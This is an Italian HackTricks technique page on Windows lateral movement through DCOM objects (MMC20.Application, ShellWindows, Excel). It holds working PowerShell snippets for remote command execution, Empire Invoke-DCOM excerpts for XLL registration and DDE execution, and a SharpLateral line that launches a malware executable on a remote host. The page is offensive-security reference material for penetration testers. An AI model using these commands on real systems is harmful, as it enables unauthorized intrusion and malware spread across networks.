# DCOM Exec

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la **tua azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo di hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo di hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## MMC20.Application

**Per ulteriori informazioni su questa tecnica, controlla il post originale su [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**


Gli oggetti Distributed Component Object Model (DCOM) presentano una capacità interessante per interazioni basate su rete con gli oggetti. Microsoft fornisce una documentazione completa sia per DCOM che per Component Object Model (COM), accessibile [qui per DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) e [qui per COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). È possibile recuperare un elenco delle applicazioni DCOM utilizzando il comando PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
L'oggetto COM, [Classe dell'applicazione MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), consente lo scripting delle operazioni snap-in di MMC. In particolare, questo oggetto contiene un metodo `ExecuteShellCommand` sotto `Document.ActiveView`. Ulteriori informazioni su questo metodo possono essere trovate [qui](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Controlla eseguendo:

Questa funzionalità facilita l'esecuzione di comandi su una rete tramite un'applicazione DCOM. Per interagire con DCOM in remoto come amministratore, PowerShell può essere utilizzato nel seguente modo:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Questo comando si connette all'applicazione DCOM e restituisce un'istanza dell'oggetto COM. Il metodo ExecuteShellCommand può quindi essere invocato per eseguire un processo sull'host remoto. Il processo coinvolge i seguenti passaggi:

Controlla i metodi:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Ottenere l'esecuzione remota di codice (RCE):
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Per ulteriori informazioni su questa tecnica, controlla il post originale [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

L'oggetto **MMC20.Application** è stato identificato come privo di "LaunchPermissions" esplicite, con autorizzazioni predefinite che consentono l'accesso agli amministratori. Per ulteriori dettagli, è possibile esplorare un thread [qui](https://twitter.com/tiraniddo/status/817532039771525120), e si consiglia l'utilizzo di [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET per filtrare gli oggetti senza autorizzazioni di avvio esplicite.

Due specifici oggetti, `ShellBrowserWindow` e `ShellWindows`, sono stati evidenziati per la mancanza di autorizzazioni di avvio esplicite. L'assenza di una voce di registro `LaunchPermission` sotto `HKCR:\AppID\{guid}` indica l'assenza di autorizzazioni esplicite.

###  ShellWindows
Per `ShellWindows`, che manca di un ProgID, i metodi .NET `Type.GetTypeFromCLSID` e `Activator.CreateInstance` facilitano l'istanziazione dell'oggetto utilizzando il suo AppID. Questo processo sfrutta OleView .NET per recuperare il CLSID per `ShellWindows`. Una volta istanziato, l'interazione è possibile attraverso il metodo `WindowsShell.Item`, portando all'invocazione del metodo come `Document.Application.ShellExecute`.

Sono stati forniti esempi di comandi PowerShell per istanziare l'oggetto ed eseguire comandi in remoto:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Movimento laterale con oggetti DCOM di Excel

Il movimento laterale può essere ottenuto sfruttando gli oggetti DCOM di Excel. Per informazioni dettagliate, è consigliabile leggere la discussione sull'utilizzo di Excel DDE per il movimento laterale tramite DCOM sul [blog di Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Il progetto Empire fornisce uno script PowerShell, che dimostra l'utilizzo di Excel per l'esecuzione remota di codice (RCE) manipolando gli oggetti DCOM. Di seguito sono riportati frammenti dello script disponibile nel [repository GitHub di Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), che mostrano diversi metodi per abusare di Excel per RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Strumenti di Automazione per lo Spostamento Laterale

Due strumenti sono evidenziati per automatizzare queste tecniche:

- **Invoke-DCOM.ps1**: Uno script PowerShell fornito dal progetto Empire che semplifica l'invocazione di diversi metodi per eseguire codice su macchine remote. Questo script è accessibile nel repository GitHub di Empire.

- **SharpLateral**: Uno strumento progettato per eseguire codice in remoto, che può essere utilizzato con il comando:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Strumenti Automatici

* Lo script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) consente di invocare facilmente tutti i modi commentati per eseguire codice in altre macchine.
* È possibile utilizzare anche [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Riferimenti

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.

</details>
